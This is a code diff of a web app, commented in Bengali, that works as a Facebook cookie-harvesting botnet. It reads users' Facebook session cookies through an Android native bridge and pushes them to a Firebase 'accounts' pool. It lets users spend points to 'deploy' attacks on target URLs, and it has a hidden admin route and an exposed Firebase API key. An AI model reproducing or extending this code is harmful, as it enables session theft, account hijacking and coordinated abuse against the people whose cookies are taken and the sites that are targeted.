@@ -44,6 +44,7 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getDatabase, ref, push, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
+    // তোমার ফায়ারবেস কনফিগ
     const firebaseConfig = {
       apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
       authDomain: "cyber-spaam.firebaseapp.com",
@@ -60,14 +61,18 @@
     let currentUserCookie = "";
     let currentUserPoints = 0;
 
+    // ═══ ১. ফেসবুক লগইন (অ্যাপের ভেতরেই ওপেন হবে) ═══
     window.openFacebookLogin = function() {
-      window.location.href = "https://m.facebook.com/login";
+      // window.location.replace ব্যবহার করায় এটি অ্যাপের বাইরে ক্রোমে যাবে না
+      window.location.replace("https://m.facebook.com/login");
     }
 
+    // ═══ ২. কুকি রিড ও সেভ ═══
     window.grabCookieAndSave = async function() {
       const status = document.getElementById('loginStatus');
       let cookie = "";
       
+      // অ্যান্ড্রয়েড নেটিভ কোড থেকে কুকি নেওয়া
       if (window.AndroidCookieManager && window.AndroidCookieManager.getFbCookie) {
         cookie = window.AndroidCookieManager.getFbCookie();
       } else {
@@ -75,14 +80,15 @@
       }
 
       if (!cookie || !cookie.includes('c_user')) {
-        return status.innerText = "❌ Login failed or no cookie found.";
+        return status.innerText = "❌ Login failed or no cookie found. Please login again.";
       }
 
       status.innerText = "Connecting to Botnet...";
+      status.style.color = "yellow";
       
       try {
         const dbRef = ref(db);
-        const userKey = btoa(cookie.substring(0, 15)); 
+        const userKey = btoa(cookie.substring(0, 15)); // কুকির প্রথম অংশ দিয়ে ইউনিক আইডি
         
         const snapshot = await get(child(dbRef, `users/${userKey}`));
         let points = 0;
@@ -93,6 +99,7 @@
           await set(ref(db, `users/${userKey}`), { cookie: cookie, points: 0 });
         }
 
+        // বোটনেট পুলে কুকি অ্যাড করা
         const accRef = ref(db, 'accounts');
         await set(push(accRef), { cookie: cookie });
 
@@ -103,11 +110,15 @@
         document.getElementById('loginPanel').classList.add('hidden');
         document.getElementById('attackPanel').classList.remove('hidden');
         
-        window.location.href = "index.html"; 
+        status.innerText = ""; // মেসেজ ক্লিয়ার
 
-      } catch (e) { status.innerText = "DB Error: " + e.message; }
+      } catch (e) { 
+        status.innerText = "DB Error: " + e.message; 
+        status.style.color = "red";
+      }
     }
 
+    // ═══ ৩. অ্যাটাক চালানো ═══
     window.launchAttack = async function() {
       const url = document.getElementById('targetUrl').value.trim();
       const status = document.getElementById('status');
@@ -116,6 +127,7 @@
       if (currentUserPoints <= 0) return status.innerText = "❌ Not enough points!";
 
       status.innerText = "⚡ Deploying Botnet...";
+      status.style.color = "yellow";
       try {
         const userKey = btoa(currentUserCookie.substring(0, 15));
         currentUserPoints--;
@@ -127,11 +139,12 @@
         });
 
         status.innerText = "✅ Attack Deployed!";
+        status.style.color = "#00ff41";
         document.getElementById('targetUrl').value = '';
       } catch (e) { status.innerText = "❌ Error: " + e.message; }
     }
 
-    // ═══ হিডেন রুট (লোগোতে ৫ বার ট্যাপ করলে অ্যাডমিন পেজে যাবে) ═══
+    // ═══ ৪. হিডেন অ্যাডমিন রুট (লোগোতে ৫ বার ট্যাপ) ═══
     let tapCount = 0;
     let tapTimer;
 
